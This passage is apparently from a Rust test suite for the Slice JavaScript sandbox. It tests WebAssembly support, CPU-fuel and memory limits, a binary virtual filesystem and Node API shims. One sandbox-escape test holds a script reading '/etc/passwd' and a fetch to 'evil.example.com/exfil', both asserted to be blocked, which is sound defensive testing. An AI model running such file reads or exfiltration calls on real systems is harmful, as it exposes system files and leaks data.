#![allow(unused_imports)]
use crate::intrinsics::{
    digest_to_hex, fast_format_bytes, fast_format_ms, fast_parse_bytes, fast_parse_ms,
    hmac_sha256_hex, sha256_hex, Sha256State,
};
use crate::{
    compile_source_to_bytecode, disassemble_bytecode, run_source_isolated, ExecutionTier,
    HttpRequestContext, JsValue, SliceIsolate,
};
use slice_sandbox::{CapabilityToken, SandboxViolation};

#[test]
fn test_wave_d_wasm_compile_instantiate_memory_globals_and_host_imports() {
    let script = r#"
        const sec = (id, body) => [id, body.length, ...body];
        const str = (s) => [s.length, ...Array.from(s, (c) => c.charCodeAt(0))];
        const body = (bytes) => [bytes.length, ...bytes];

        const wasmBytes = new Uint8Array([
            0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,
            // Custom section (id 0): name "slice_meta" + payload "SLC"
            ...sec(0x00, [...str("slice_meta"), 0x53, 0x4C, 0x43]),
            // Type section (id 1): 2 types
            ...sec(0x01, [
                0x02,
                0x60, 0x02, 0x7F, 0x7F, 0x01, 0x7F, // Type 0: (i32, i32) -> i32
                0x60, 0x01, 0x7E, 0x01, 0x7E        // Type 1: (i64) -> i64
            ]),
            // Import section (id 2): 1 import: "env"."host_scale" -> func type 0
            ...sec(0x02, [
                0x01,
                ...str("env"),
                ...str("host_scale"),
                0x00, 0x00
            ]),
            // Function section (id 3): 2 functions (type 0, type 1)
            ...sec(0x03, [0x02, 0x00, 0x01]),
            // Memory section (id 5): 1 memory (limits: flags=1, min=1, max=4)
            ...sec(0x05, [0x01, 0x01, 0x01, 0x04]),
            // Global section (id 6): 1 mutable i32 global = 100
            ...sec(0x06, [0x01, 0x7F, 0x01, 0x41, 0xE4, 0x00, 0x0B]),
            // Export section (id 7): 4 exports
            ...sec(0x07, [
                0x04,
                ...str("memory"), 0x02, 0x00,
                ...str("counter"), 0x03, 0x00,
                ...str("compute_and_xor"), 0x00, 0x01,
                ...str("mix64"), 0x00, 0x02
            ]),
            // Code section (id 10): 2 function bodies
            ...sec(0x0A, [
                0x02,
                ...body([
                    0x00, // 0 locals
                    0x20, 0x00,
                    0x20, 0x00, 0x28, 0x02, 0x00,
                    0x20, 0x00, 0x20, 0x01, 0x10, 0x00,
                    0x6A,
                    0x23, 0x00,
                    0x6A,
                    0x36, 0x02, 0x00,
                    0x23, 0x00, 0x41, 0x05, 0x6A, 0x24, 0x00,
                    0x20, 0x00, 0x28, 0x02, 0x00,
                    0x0B
                ]),
                ...body([
                    0x00, // 0 locals
                    0x20, 0x00, 0x42, 0x07, 0x7E, 0x42, 0x03, 0x7C,
                    0x0B
                ])
            ])
        ]);

        const valid = WebAssembly.validate(wasmBytes);
        const mod = new WebAssembly.Module(wasmBytes);
        const exportsMeta = WebAssembly.Module.exports(mod);
        const importsMeta = WebAssembly.Module.imports(mod);
        const customSecs = WebAssembly.Module.customSections(mod, "slice_meta");
        const customText = new TextDecoder().decode(new Uint8Array(customSecs[0]));

        let hostCallCount = 0;
        const importObj = {
            env: {
                host_scale(ptr, len) {
                    hostCallCount++;
                    return (ptr + len) * 3;
                }
            }
        };

        const inst1 = new WebAssembly.Instance(mod, importObj);
        const memView = new Int32Array(inst1.exports.memory.buffer);
        memView[4] = 1000; // byte offset 16

        // Call compute_and_xor(16, 4):
        // mem[16] = 1000 + host_scale(16, 4) [60] + counter [100] = 1160
        // counter becomes 105
        const res1 = inst1.exports.compute_and_xor(16, 4);
        const memAfter = new Int32Array(inst1.exports.memory.buffer)[4];
        const counterAfter = inst1.exports.counter.value;
        inst1.exports.counter.value = 200;
        const res2 = inst1.exports.compute_and_xor(16, 4); // 1160 + 60 + 200 = 1420

        // Test memory.grow(1) and verify existing data is preserved
        const prevPages = inst1.exports.memory.grow(1);
        const grownBytes = inst1.exports.memory.buffer.byteLength;
        const preservedWord = new Int32Array(inst1.exports.memory.buffer)[4];

        // Test i64 BigInt roundtrip
        const mix64Res = inst1.exports.mix64(10n);

        // Test standalone WebAssembly.Global & WebAssembly.Table & async WebAssembly.instantiate
        const standaloneGlobal = new WebAssembly.Global({ value: "i32", mutable: true }, 42);
        standaloneGlobal.value = 99;
        const table = new WebAssembly.Table({ element: "anyfunc", initial: 2, maximum: 4 });
        const prevTableLen = table.grow(1);

        WebAssembly.instantiate(wasmBytes, importObj).then(({ module, instance }) => {
            console.log(JSON.stringify({
                valid,
                exportsCount: exportsMeta.length,
                importsCount: importsMeta.length,
                customText,
                hostCallCount,
                res1,
                memAfter,
                counterAfter,
                res2,
                prevPages,
                grownBytes,
                preservedWord,
                mix64Res: String(mix64Res),
                standaloneGlobal: standaloneGlobal.value,
                prevTableLen,
                tableLen: table.length,
                asyncInstOk: typeof instance.exports.compute_and_xor === "function"
            }));
        });
    "#;

    let m = run_source_isolated(
        "wave-d-wasm-full",
        script,
        CapabilityToken::pure_compute(),
        5_000_000,
        32 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(
        m.stdout[0],
        r#"{"valid":true,"exportsCount":4,"importsCount":1,"customText":"SLC","hostCallCount":2,"res1":1160,"memAfter":1160,"counterAfter":105,"res2":1420,"prevPages":1,"grownBytes":131072,"preservedWord":1420,"mix64Res":"73","standaloneGlobal":99,"prevTableLen":2,"tableLen":3,"asyncInstOk":true}"#
    );
    assert!(
        crate::wasm::wasm_module_cache_hits() >= 1,
        "Expected GLOBAL_WASM_MODULE_CACHE to record at least 1 warm hit"
    );
}

#[test]
fn test_wave_d_wasm_5_ring_security_fuel_bomb_and_memory_cage() {
    // 1. Ring 1 (Invalid Magic Header -> CompileError) & Ring 4 (Missing Host Import -> LinkError)
    {
        let script = r#"
            const invalidBytes = new Uint8Array([0x00, 0x01, 0x02, 0x03]);
            const isValid = WebAssembly.validate(invalidBytes);
            let compileErrOk = false;
            try {
                new WebAssembly.Module(invalidBytes);
            } catch (e) {
                compileErrOk = e instanceof WebAssembly.CompileError;
            }

            // Minimal module importing env.missing1
            const importModBytes = new Uint8Array([
                0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,
                0x01, 0x04, 0x01, 0x60, 0x00, 0x00,
                0x02, 0x10, 0x01, 0x03, 0x65, 0x6E, 0x76, 0x08, 0x6D, 0x69, 0x73, 0x73, 0x69, 0x6E, 0x67, 0x31, 0x00, 0x00
            ]);
            let linkErrOk = false;
            try {
                const m = new WebAssembly.Module(importModBytes);
                new WebAssembly.Instance(m, {});
            } catch (e) {
                linkErrOk = e instanceof WebAssembly.LinkError;
            }
            console.log(JSON.stringify({ isValid, compileErrOk, linkErrOk }));
        "#;
        let m = run_source_isolated(
            "wave-d-wasm-errors",
            script,
            CapabilityToken::pure_compute(),
            500_000,
            16 * 1024 * 1024,
        )
        .unwrap();
        assert_eq!(
            m.stdout[0],
            r#"{"isValid":false,"compileErrOk":true,"linkErrOk":true}"#
        );
    }

    // 2. Ring 2: Infinite WASM Loop `(loop (br 0))` deterministically trapped by shared CPU Fuel Meter
    {
        let script = r#"
            const spinWasm = new Uint8Array([
                0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,
                0x01, 0x04, 0x01, 0x60, 0x00, 0x00,
                0x03, 0x02, 0x01, 0x00,
                0x07, 0x08, 0x01, 0x04, 0x73, 0x70, 0x69, 0x6E, 0x00, 0x00,
                0x0A, 0x09, 0x01, 0x07, 0x00, 0x03, 0x40, 0x0C, 0x00, 0x0B, 0x0B
            ]);
            const mod = new WebAssembly.Module(spinWasm);
            const inst = new WebAssembly.Instance(mod);
            inst.exports.spin();
        "#;
        let err = run_source_isolated(
            "wave-d-wasm-fuel-bomb",
            script,
            CapabilityToken::pure_compute(),
            25_000,
            16 * 1024 * 1024,
        )
        .unwrap_err();
        assert!(
            matches!(
                err.downcast_ref::<SandboxViolation>(),
                Some(SandboxViolation::CpuFuelExhausted { .. })
            ),
            "Expected SandboxViolation::CpuFuelExhausted on infinite WASM loop, got {:?}",
            err
        );
    }

    // 3. Ring 3: WASM Linear Memory Bomb exceeding tenant memory ceiling deterministically trapped
    {
        let script = r#"
            // Request 32 pages (2 MB) > 512 KB tenant ceiling
            const mem = new WebAssembly.Memory({ initial: 32 });
        "#;
        let err = run_source_isolated(
            "wave-d-wasm-mem-bomb",
            script,
            CapabilityToken::pure_compute(),
            500_000,
            512 * 1024, // 512 KB tenant ceiling
        )
        .unwrap_err();
        assert!(
            matches!(
                err.downcast_ref::<SandboxViolation>(),
                Some(SandboxViolation::MemoryCeilingExceeded { .. })
            ),
            "Expected SandboxViolation::MemoryCeilingExceeded on oversized WASM memory, got {:?}",
            err
        );
    }
}

#[test]
fn test_wave_g_binary_vfs_roundtrip_eval_sandbox_ocap_and_bounded_fetch_concurrency() {
    // 1. Binary VFS (`BOA_VFS_CACHE: FxHashMap<String, Vec<u8>>`) + Checkpoint/Restore without UTF-8 lossy corruption
    let vfs_script = r#"
import * as fs from "node:fs";

const nonUtf8 = new Uint8Array([0xff, 0xfe, 0x00, 0x80, 0xc3, 0x28]);
fs.writeFileSync("/workspace/raw.bin", nonUtf8);
fs.appendFileSync("/workspace/raw.bin", Buffer.from([0xde, 0xad]));

const snap = Slice.checkpoint();
fs.writeFileSync("/workspace/raw.bin", "corrupted-overwrite");
Slice.restore(snap);

const readBuf = fs.readFileSync("/workspace/raw.bin", null);
const readHex = fs.readFileSync("/workspace/raw.bin", "hex");
const st = fs.statSync("/workspace/raw.bin");

// Also verify Slice.evalSandbox blocks capability escalation when parent has only /workspace read/write
const escFs = Slice.evalSandbox("const fs = require('node:fs'); fs.readFileSync('/etc/passwd', 'utf8');", {
    allowRead: ["/etc"]
});
const escNet = Slice.evalSandbox("fetch('https://evil.example.com/exfil');", {
    allowNet: ["evil.example.com"]
});

console.log(JSON.stringify({
    bytes: Array.from(readBuf),
    hex: readHex,
    size: st.size,
    mtimeReal: st.mtimeMs !== 1700000000000 && st.mtimeMs > 1700000000000,
    escFsBlocked: escFs.ok === false && String(escFs.violation).includes("lacks filesystem read authority"),
    escNetBlocked: escNet.ok === false && String(escNet.violation).includes("lacks outbound network authority")
}));
"#;

    let caps = CapabilityToken::pure_compute()
        .with_read_prefix("/workspace")
        .with_write_prefix("/workspace");
    let m = run_source_isolated(
        "wave-g-binary-vfs",
        vfs_script,
        caps,
        1_000_000,
        16 * 1024 * 1024,
    )
    .expect("wave-g-binary-vfs execution");
    let parsed: serde_json::Value = serde_json::from_str(&m.stdout[0]).unwrap();
    assert_eq!(
        parsed["bytes"],
        serde_json::json!([0xff, 0xfe, 0x00, 0x80, 0xc3, 0x28, 0xde, 0xad]),
        "Binary VFS must preserve arbitrary non-UTF-8 bytes across writeFileSync/appendFileSync/checkpoint/restore"
    );
    assert_eq!(parsed["hex"], "fffe0080c328dead");
    assert_eq!(parsed["size"], 8);
    assert_eq!(parsed["mtimeReal"], true);
    assert_eq!(parsed["escFsBlocked"], true);
    assert_eq!(parsed["escNetBlocked"], true);

    // 2. Direct Rust `SliceIsolate::eval_sandbox` on a `pure_compute()` parent must block child escalation
    let mut pure_parent = SliceIsolate::spawn(
        "wave-g-pure-parent",
        1,
        CapabilityToken::pure_compute(),
        1_000_000,
        8 * 1024 * 1024,
    );
    let outcome_fs = pure_parent.eval_sandbox(
        "const fs = require('node:fs'); fs.readFileSync('/etc/passwd', 'utf8');",
        crate::SandboxEvalOptions {
            allow_read: vec!["/etc".to_string()],
            ..Default::default()
        },
    );
    assert!(
        !outcome_fs.ok
            && outcome_fs
                .violation
                .as_deref()
                .unwrap_or("")
                .contains("lacks filesystem read authority"),
        "pure_compute() parent must never allow child allow_read escalation: {:?}",
        outcome_fs
    );

    let outcome_net = pure_parent.eval_sandbox(
        "fetch('https://evil.example.com/exfil');",
        crate::SandboxEvalOptions {
            allow_net: vec!["evil.example.com".to_string()],
            ..Default::default()
        },
    );
    assert!(
        !outcome_net.ok
            && outcome_net
                .violation
                .as_deref()
                .unwrap_or("")
                .contains("lacks outbound network authority"),
        "pure_compute() parent must never allow child allow_net escalation: {:?}",
        outcome_net
    );

    // 3. Concurrent `Promise.all` fetch batching > 16 requests bounded by `MAX_CONCURRENT_FETCHES = 16`
    use std::io::{Read, Write};
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let server_handle = std::thread::spawn(move || {
        for _ in 0..24 {
            if let Ok((mut stream, _)) = listener.accept() {
                let mut buf = [0u8; 1024];
                let n = stream.read(&mut buf).unwrap_or(0);
                let req_str = String::from_utf8_lossy(&buf[..n]);
                let id = req_str
                    .lines()
                    .next()
                    .and_then(|l| l.split_whitespace().nth(1))
                    .unwrap_or("/0")
                    .trim_start_matches('/');
                let body = format!("ok-{}", id);
                let resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(resp.as_bytes());
            }
        }
    });

    let batch_script = format!(
        r#"
(async () => {{
    const urls = [];
    for (let i = 0; i < 24; i++) {{
        urls.push("http://127.0.0.1:{port}/" + i);
    }}
    const responses = await Promise.all(urls.map((u) => fetch(u).then((r) => r.text())));
    console.log(JSON.stringify({{ count: responses.length, first: responses[0], last: responses[23] }}));
}})();
"#,
        port = port
    );
    let fetch_caps = CapabilityToken::pure_compute().with_net_host("127.0.0.1");
    let fm = run_source_isolated(
        "wave-g-bounded-fetch",
        &batch_script,
        fetch_caps,
        2_000_000,
        16 * 1024 * 1024,
    )
    .expect("wave-g-bounded-fetch execution");
    let _ = server_handle.join();
    let f_out: serde_json::Value = serde_json::from_str(&fm.stdout[0]).unwrap();
    assert_eq!(f_out["count"], 24);
    assert_eq!(f_out["first"], "ok-0");
    assert_eq!(f_out["last"], "ok-23");
}

#[test]
fn test_wave_h_lazy_host_binding_gating_on_cold_realm_and_on_demand_activation() {
    // 1. Fresh cold `WarmBoaRealm` must NOT eagerly register HTTP bridge, KV/sandbox, or SemVer/fast-ms host bindings
    let mut cold_realm = crate::boa_realm::create_warm_boa_realm();
    let global = cold_realm.ctx.global_object();
    for deferred_binding in [
        "__slice_http_method",
        "__slice_http_respond",
        "__slice_kv_get",
        "__slice_eval_sandbox",
        "__slice_semver_valid",
        "__slice_fast_ms",
        "__slice_btoa",
    ] {
        assert!(
            !global
                .has_own_property(
                    boa_engine::JsString::from(deferred_binding),
                    &mut cold_realm.ctx
                )
                .unwrap_or(true),
            "Cold WarmBoaRealm should NOT eagerly register {}",
            deferred_binding
        );
    }

    // 2. When a script uses `Slice.kv`, `Slice.evalSandbox`, `btoa`, and `slice:semver`, those host bindings are registered on demand
    let script = r#"
import semver from "slice:semver";
Slice.kv.set("wave-h-key", "active-val");
const kvVal = Slice.kv.get("wave-h-key");
const b64 = btoa("wave-h");
const svOk = semver.satisfies("2.5.0", ">=2.0.0 <3.0.0");
const sb = Slice.evalSandbox("19 + 23", { fuelLimit: 10000 });
console.log(JSON.stringify({ kvVal, b64, svOk, sbVal: sb.returnValue }));
"#;
    let m = run_source_isolated(
        "wave-h-lazy-bindings",
        script,
        CapabilityToken::pure_compute(),
        500_000,
        8 * 1024 * 1024,
    )
    .expect("wave-h-lazy-bindings execution");
    let parsed: serde_json::Value = serde_json::from_str(&m.stdout[0]).unwrap();
    assert_eq!(parsed["kvVal"], "active-val");
    assert_eq!(parsed["b64"], "d2F2ZS1o");
    assert_eq!(parsed["svOk"], true);
    assert_eq!(parsed["sbVal"], "42");
}

#[test]
fn test_wave_i_end_to_end_aliases_import_meta_dynamic_import_and_node_url() {
    let test_dir = std::env::temp_dir().join("slice_wave_i_engine_e2e_test");
    let _ = std::fs::remove_dir_all(&test_dir);
    std::fs::create_dir_all(test_dir.join("src/services")).unwrap();
    std::fs::create_dir_all(test_dir.join("src/internal")).unwrap();

    std::fs::write(
        test_dir.join("tsconfig.json"),
        r#"{
  // Wave I tsconfig paths with JSONC comments
  "compilerOptions": {
    "baseUrl": ".",
    "paths": {
      "@/*": ["./src/*"],
    },
  },
}"#,
    )
    .unwrap();

    std::fs::write(
        test_dir.join("package.json"),
        r##"{
  "name": "wave-i-e2e",
  "imports": {
    "#internal/*": "./src/internal/*.ts"
  }
}"##,
    )
    .unwrap();

    std::fs::write(
        test_dir.join("src/internal/token.ts"),
        r#"export const SECRET_PREFIX = "tok_wave_i";
"#,
    )
    .unwrap();

    std::fs::write(
        test_dir.join("src/services/plugin.ts"),
        r##"import { SECRET_PREFIX } from "#internal/token";
export function runPlugin(id: number): string {
  return `${SECRET_PREFIX}_${id}`;
}
"##,
    )
    .unwrap();

    let entry_path = test_dir.join("src/index.ts");
    std::fs::write(
        &entry_path,
        r#"import { fileURLToPath, pathToFileURL } from "node:url";
import path from "node:path";

const mod = await import("@/services/plugin");
const fromMeta = fileURLToPath(import.meta.url);
const roundtripHref = pathToFileURL(__filename).href;
console.log(JSON.stringify({
  pluginOut: mod.runPlugin(99),
  sameFile: fromMeta === __filename && import.meta.filename === __filename,
  sameDir: path.dirname(fromMeta) === __dirname && import.meta.dirname === __dirname,
  sameUrl: roundtripHref === import.meta.url,
}));
"#,
    )
    .unwrap();

    let bundled =
        slice_cas::bundle_entrypoint_with_deps(&entry_path).expect("bundle_entrypoint_with_deps");
    let _ = std::fs::remove_dir_all(&test_dir);

    let m = run_source_isolated(
        "wave-i-e2e",
        &bundled,
        CapabilityToken::pure_compute(),
        500_000,
        8 * 1024 * 1024,
    )
    .expect("wave-i-e2e execution");
    let parsed: serde_json::Value = serde_json::from_str(&m.stdout[0]).unwrap();
    assert_eq!(parsed["pluginOut"], "tok_wave_i_99");
    assert_eq!(parsed["sameFile"], true);
    assert_eq!(parsed["sameDir"], true);
    assert_eq!(parsed["sameUrl"], true);
}

#[test]
fn test_wave_j_async_local_storage_compression_streams_zlib_and_url_pattern() {
    let script = r#"
import { AsyncLocalStorage, AsyncResource } from "node:async_hooks";
import zlib from "node:zlib";
import { promisify } from "node:util";

async function runWaveJ() {
  // 1. AsyncLocalStorage across concurrent Promise.all, setTimeout, queueMicrotask, nextTick, exit, snapshot, AsyncResource
  const reqStore = new AsyncLocalStorage();
  const traceStore = new AsyncLocalStorage();

  const [resA, resB] = await Promise.all([
    reqStore.run({ reqId: "req-alpha" }, async () => {
      await Promise.resolve();
      const s1 = reqStore.getStore().reqId;
      await new Promise((r) => setTimeout(r, 8));
      const s2 = reqStore.getStore().reqId;
      const nested = await traceStore.run({ span: "span-1" }, async () => {
        await new Promise((r) => queueMicrotask(r));
        return `${reqStore.getStore().reqId}:${traceStore.getStore().span}`;
      });
      const exited = reqStore.exit(() => reqStore.getStore());
      return { s1, s2, nested, exitedIsUndefined: exited === undefined, afterExit: reqStore.getStore().reqId };
    }),
    reqStore.run({ reqId: "req-beta" }, async () => {
      await new Promise((r) => setTimeout(r, 2));
      const s1 = reqStore.getStore().reqId;
      const fromNextTick = await new Promise((r) => process.nextTick(() => r(reqStore.getStore().reqId)));
      return { s1, fromNextTick };
    }),
  ]);

  let snapResult = "";
  let resourceResult = "";
  reqStore.run({ reqId: "req-snap" }, () => {
    const runInSnap = AsyncLocalStorage.snapshot();
    const ar = new AsyncResource("CustomPool");
    reqStore.run({ reqId: "req-overridden" }, () => {
      snapResult = runInSnap(() => reqStore.getStore().reqId);
      resourceResult = ar.runInAsyncScope(() => reqStore.getStore().reqId);
    });
  });

  // 2. CompressionStream / DecompressionStream ("gzip", "deflate", "deflate-raw") + node:zlib
  const payload = "Slice WinterTC Edge Compression & Decompression Stream Verification! ".repeat(20);
  const streamFormats = ["gzip", "deflate", "deflate-raw"];
  const streamResults = {};
  for (const fmt of streamFormats) {
    const cs = new CompressionStream(fmt);
    const compressedStream = new Blob([payload]).stream().pipeThrough(cs);
    const compressedBytes = new Uint8Array(await new Response(compressedStream).arrayBuffer());
    const ds = new DecompressionStream(fmt);
    const decompressedStream = new Blob([compressedBytes]).stream().pipeThrough(ds);
    const roundtripText = await new Response(decompressedStream).text();
    streamResults[fmt] = {
      compressedSmaller: compressedBytes.byteLength < payload.length,
      matches: roundtripText === payload,
    };
  }

  const gzBuf = zlib.gzipSync(payload);
  const gunzStr = zlib.gunzipSync(gzBuf).toString("utf8");
  const defBuf = zlib.deflateSync(payload);
  const infStr = zlib.inflateSync(defBuf).toString("utf8");
  const rawBuf = zlib.deflateRawSync(payload);
  const infRawStr = zlib.inflateRawSync(rawBuf).toString("utf8");
  const unzipAutoGz = zlib.unzipSync(gzBuf).toString("utf8");
  const unzipAutoDef = zlib.unzipSync(defBuf).toString("utf8");
  const gzipAsync = promisify(zlib.gzip);
  const gunzipAsync = promisify(zlib.gunzip);
  const asyncRoundtrip = (await gunzipAsync(await gzipAsync("async-zlib-ok"))).toString("utf8");

  // 3. URLPattern global routing primitive
  const p1 = new URLPattern("https://api.example.com/v1/users/:id/posts/:postId?");
  const m1 = p1.exec("https://api.example.com/v1/users/42/posts/99?sort=asc#top");
  const m2 = p1.exec("https://api.example.com/v1/users/42/posts");
  const p2 = new URLPattern({ pathname: "/files/:dir+/download/*" });
  const m3 = p2.exec("https://cdn.example.com/files/a/b/c/download/report.pdf");
  const p3 = new URLPattern("/items/:id(\\d+)", "https://shop.example.com");

  console.log(JSON.stringify({
    als: {
      resA,
      resB,
      snapResult,
      resourceResult,
      outsideIsUndefined: reqStore.getStore() === undefined,
    },
    compression: {
      streamResults,
      zlibOk:
        gunzStr === payload &&
        infStr === payload &&
        infRawStr === payload &&
        unzipAutoGz === payload &&
        unzipAutoDef === payload &&
        asyncRoundtrip === "async-zlib-ok",
    },
    urlPattern: {
      m1Id: m1.pathname.groups.id,
      m1PostId: m1.pathname.groups.postId,
      m2Id: m2.pathname.groups.id,
      m2PostIdUndefined: m2.pathname.groups.postId === undefined,
      m3Dir: m3.pathname.groups.dir,
      m3Wild: m3.pathname.groups["0"],
      p3NumericMatch: p3.test("https://shop.example.com/items/12345"),
      p3AlphaReject: !p3.test("https://shop.example.com/items/abc"),
      p3HasRegExp: p3.hasRegExpGroups,
    },
  }));
}
runWaveJ().catch((e) => console.log(JSON.stringify({ __err: String(e && e.stack || e) })));
"#;

    let test_dir = std::env::temp_dir().join(format!("slice_wave_j_test_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&test_dir);
    std::fs::create_dir_all(&test_dir).unwrap();
    let entry_path = test_dir.join("index.ts");
    std::fs::write(&entry_path, script).unwrap();
    let bundled =
        slice_cas::bundle_entrypoint_with_deps(&entry_path).expect("bundle wave j script");
    let _ = std::fs::remove_dir_all(&test_dir);

    let m = run_source_isolated(
        "wave-j-tenant",
        &bundled,
        CapabilityToken::pure_compute(),
        800_000,
        16 * 1024 * 1024,
    )
    .expect("wave-j execution");
    let out: serde_json::Value = serde_json::from_str(&m.stdout[0]).expect("parse wave-j json");
    assert!(out.get("__err").is_none(), "wave-j error: {}", out);

    assert_eq!(out["als"]["resA"]["s1"], "req-alpha");
    assert_eq!(out["als"]["resA"]["s2"], "req-alpha");
    assert_eq!(out["als"]["resA"]["nested"], "req-alpha:span-1");
    assert_eq!(out["als"]["resA"]["exitedIsUndefined"], true);
    assert_eq!(out["als"]["resA"]["afterExit"], "req-alpha");
    assert_eq!(out["als"]["resB"]["s1"], "req-beta");
    assert_eq!(out["als"]["resB"]["fromNextTick"], "req-beta");
    assert_eq!(out["als"]["snapResult"], "req-snap");
    assert_eq!(out["als"]["resourceResult"], "req-snap");
    assert_eq!(out["als"]["outsideIsUndefined"], true);

    for fmt in ["gzip", "deflate", "deflate-raw"] {
        assert_eq!(
            out["compression"]["streamResults"][fmt]["compressedSmaller"],
            true
        );
        assert_eq!(out["compression"]["streamResults"][fmt]["matches"], true);
    }
    assert_eq!(out["compression"]["zlibOk"], true);

    assert_eq!(out["urlPattern"]["m1Id"], "42");
    assert_eq!(out["urlPattern"]["m1PostId"], "99");
    assert_eq!(out["urlPattern"]["m2Id"], "42");
    assert_eq!(out["urlPattern"]["m2PostIdUndefined"], true);
    assert_eq!(out["urlPattern"]["m3Dir"], "a/b/c");
    assert_eq!(out["urlPattern"]["m3Wild"], "report.pdf");
    assert_eq!(out["urlPattern"]["p3NumericMatch"], true);
    assert_eq!(out["urlPattern"]["p3AlphaReject"], true);
    assert_eq!(out["urlPattern"]["p3HasRegExp"], true);
}

#[test]
fn test_issues_28_31_33_37_fs_readline_json_fastpath_and_uncaught_source_map() {
    use slice_sandbox::CapabilityToken;

    let script = r#"
import fs from "node:fs";
import fsp from "node:fs/promises";
import readline from "node:readline";
import readlinePromises from "node:readline/promises";
import { PassThrough } from "node:stream";
import v8 from "node:v8";
import cluster from "node:cluster";
import http2 from "node:http2";
import { WASI } from "node:wasi";

async function runAuditSuite() {
  // 1. Issue #28: node:fs cpSync, truncateSync, utimesSync, readlinkSync, watch
  fs.mkdirSync("/app/src_dir/nested", { recursive: true });
  fs.writeFileSync("/app/src_dir/nested/hello.txt", "hello-world-12345");
  fs.cpSync("/app/src_dir", "/app/dst_dir", { recursive: true });
  const copiedText = fs.readFileSync("/app/dst_dir/nested/hello.txt", "utf8");
  fs.truncateSync("/app/dst_dir/nested/hello.txt", 5);
  const truncatedText = fs.readFileSync("/app/dst_dir/nested/hello.txt", "utf8");
  fs.utimesSync("/app/dst_dir/nested/hello.txt", 1700000000, 1700000000);
  fs.symlinkSync("/app/dst_dir/nested/hello.txt", "/app/dst_dir/link.txt");
  const linkTarget = fs.readlinkSync("/app/dst_dir/link.txt");

  let watchEvents: string[] = [];
  const watcher = fs.watch("/app/dst_dir/nested/hello.txt", (evt, filename) => {
    watchEvents.push(evt + ":" + filename);
  });
  fs.writeFileSync("/app/dst_dir/nested/hello.txt", "updated!");
  watcher.close();

  await fsp.cp("/app/dst_dir/nested/hello.txt", "/app/dst_dir/async_copy.txt");
  await fsp.truncate("/app/dst_dir/async_copy.txt", 4);
  const asyncTrunc = await fsp.readFile("/app/dst_dir/async_copy.txt", "utf8");

  // 2. Issue #31: node:readline & node:readline/promises + core shims
  const input1 = new PassThrough();
  const rl1 = readline.createInterface({ input: input1 });
  const lines1: string[] = [];
  rl1.on("line", (l: string) => lines1.push(l));
  input1.end("alpha\nbeta\ngamma\n");
  await new Promise((r) => setTimeout(r, 5));

  const input2 = new PassThrough();
  const rl2 = readlinePromises.createInterface({ input: input2 });
  const qPromise = rl2.question("Prompt> ");
  input2.write("answer-42\n");
  const qAnswer = await qPromise;
  rl2.close();

  const heapStats = v8.getHeapStatistics();
  const wasiInst = new WASI({ args: ["app"] });

  // 3. Issue #37: JSON.stringify fast path & sub-ms performance.now()
  const t0 = performance.now();
  const complexObj = {
    id: 101,
    active: true,
    nil: null,
    undef: undefined,
    fnVal: () => 1,
    symVal: Symbol("skip"),
    text: "quote\"backslash\\newline\ntab\tctrl\x01",
    ints: [1, 2, -3, 0, 42],
    floats: [1.5, -0.25, 3.125],
    mixed: ["a", undefined, () => {}, null, { k: "v" }],
    customToJson: {
      toJSON() {
        return "custom-to-json-ok";
      },
    },
  };
  const jsonFast = JSON.stringify(complexObj);
  const jsonPretty = JSON.stringify({ a: 1 }, null, 2);
  let cyclicThrew = false;
  const cyc: any = { a: 1 };
  cyc.self = cyc;
  try {
    JSON.stringify(cyc);
  } catch (e: any) {
    cyclicThrew = e instanceof TypeError;
  }
  const t1 = performance.now();

  console.log(JSON.stringify({
    fs: {
      copiedText,
      truncatedText,
      linkTarget,
      watchEvents,
      asyncTrunc,
    },
    readline: {
      lines1,
      qAnswer,
      v8Ok: typeof heapStats.total_heap_size === "number",
      clusterPrimary: cluster.isPrimary,
      http2StatusOk: http2.constants.HTTP_STATUS_OK === 200,
      wasiOk: typeof wasiInst.wasiImport.proc_exit === "function",
    },
    json: {
      parsedFast: JSON.parse(jsonFast),
      prettyHasNewline: jsonPretty.includes("\n  \"a\": 1"),
      cyclicThrew,
      perfDeltaValid: t1 >= t0,
    },
  }));
}
runAuditSuite().catch((e) => console.log(JSON.stringify({ __err: String(e && e.stack || e) })));
"#;

    let test_dir =
        std::env::temp_dir().join(format!("slice_issues_audit_test_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&test_dir);
    std::fs::create_dir_all(&test_dir).unwrap();
    let entry_path = test_dir.join("index.ts");
    std::fs::write(&entry_path, script).unwrap();
    let bundled =
        slice_cas::bundle_entrypoint_with_deps(&entry_path).expect("bundle audit suite script");
    let _ = std::fs::remove_dir_all(&test_dir);

    let caps = CapabilityToken::pure_compute()
        .with_read_prefix("/app")
        .with_write_prefix("/app");
    let m = run_source_isolated(
        "issues-audit-tenant",
        &bundled,
        caps,
        2_000_000,
        16 * 1024 * 1024,
    )
    .expect("issues-audit execution");
    let out: serde_json::Value = serde_json::from_str(&m.stdout[0]).expect("parse audit json");
    assert!(out.get("__err").is_none(), "audit suite error: {}", out);

    assert_eq!(out["fs"]["copiedText"], "hello-world-12345");
    assert_eq!(out["fs"]["truncatedText"], "hello");
    assert_eq!(out["fs"]["linkTarget"], "/app/dst_dir/nested/hello.txt");
    assert_eq!(out["fs"]["watchEvents"][0], "change:hello.txt");
    assert_eq!(out["fs"]["asyncTrunc"], "upda");

    assert_eq!(
        out["readline"]["lines1"],
        serde_json::json!(["alpha", "beta", "gamma"])
    );
    assert_eq!(out["readline"]["qAnswer"], "answer-42");
    assert_eq!(out["readline"]["v8Ok"], true);
    assert_eq!(out["readline"]["clusterPrimary"], true);
    assert_eq!(out["readline"]["http2StatusOk"], true);
    assert_eq!(out["readline"]["wasiOk"], true);

    assert_eq!(out["json"]["parsedFast"]["id"], 101);
    assert_eq!(
        out["json"]["parsedFast"]["text"],
        "quote\"backslash\\newline\ntab\tctrl\x01"
    );
    assert_eq!(
        out["json"]["parsedFast"]["ints"],
        serde_json::json!([1, 2, -3, 0, 42])
    );
    assert_eq!(
